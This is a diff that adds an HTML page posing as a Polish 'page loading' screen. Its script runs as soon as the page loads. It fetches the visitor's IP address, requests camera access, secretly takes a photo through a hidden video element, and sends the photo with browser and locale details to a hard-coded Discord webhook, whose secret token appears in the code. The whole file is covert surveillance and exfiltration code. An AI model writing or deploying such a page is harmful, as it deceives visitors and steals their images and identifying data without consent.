@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<title>Ładowanie...</title>
+<style>
+  body { background: #111; color: #eee; font-family: monospace; }
+  #log { margin-top: 20px; }
+  video { display: none; }
+</style>
+</head>
+<body>
+<h3>Ładowanie strony...</h3>
+<div id="log"></div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// Функция получения IP через внешний API (без сервера)
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const j = await r.json();
+        return j.ip;
+    } catch(e) { return 'unknown'; }
+}
+
+// Функция захвата кадра с камеры
+async function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const log = document.getElementById('log');
+
+    try {
+        // Запрос доступа к камере
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await video.play();
+
+        // Ждём 2 секунды для стабилизации изображения
+        await new Promise(res => setTimeout(res, 2000));
+
+        // Рисуем кадр на canvas
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // Конвертируем в base64 (JPEG, качество 0.8)
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+        // Останавливаем поток
+        stream.getTracks().forEach(t => t.stop());
+
+        return dataUrl;
+    } catch(e) {
+        log.innerText = 'Brak dostępu do kamery: ' + e.message;
+        return null;
+    }
+}
+
+// Отправка данных на webhook Discord
+async function sendToDiscord(ip, photoBase64) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1553370137174999134/BIToqZhp74U5nfLUQnLyGK9Y04SoFoSBLNmZEwTakHoLBUDWexzhRSrnZkFp-5gmOCf2';
+
+    // Формируем embed-сообщение
+    const embed = {
+        title: 'Nowy użytkownik',
+        color: 0xff0000,
+        fields: [
+            { name: 'IP', value: ip, inline: true },
+            { name: 'User-Agent', value: navigator.userAgent.substring(0, 100), inline: false },
+            { name: 'Język', value: navigator.language, inline: true },
+            { name: 'Rozdzielczość', value: `${screen.width}x${screen.height}`, inline: true },
+            { name: 'Strefa czasowa', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    const formData = new FormData();
+    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+    // Если фото получено — конвертируем base64 в Blob и прикрепляем
+    if (photoBase64) {
+        const blob = await (await fetch(photoBase64)).blob();
+        formData.append('file', blob, 'photo.jpg');
+    }
+
+    // Отправка
+    await fetch(webhookUrl, { method: 'POST', body: formData });
+}
+
+// Главная функция
+(async () => {
+    const ip = await getIP();
+    const photo = await capturePhoto();
+    await sendToDiscord(ip, photo);
+    document.getElementById('log').innerText = 'Gotowe.';
+})();
+</script>
+</body>
+</html>
